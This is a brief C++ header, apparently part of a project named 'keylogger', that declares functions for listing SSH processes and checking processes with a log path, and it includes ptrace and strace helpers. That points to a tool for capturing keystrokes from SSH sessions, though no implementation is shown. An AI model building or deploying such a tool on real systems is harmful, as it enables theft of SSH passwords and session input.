#ifndef KEYLOGGER_KEYLOGGER_HPP
#define KEYLOGGER_KEYLOGGER_HPP

#include "ptrace.hpp"
#include "strace.hpp"
#include "parsing.hpp"

std::vector<Process> get_proc_list_of_ssh();

void check_ps(const std::string& flag, std::string& path_to_log);

#endif //KEYLOGGER_KEYLOGGER_HPP
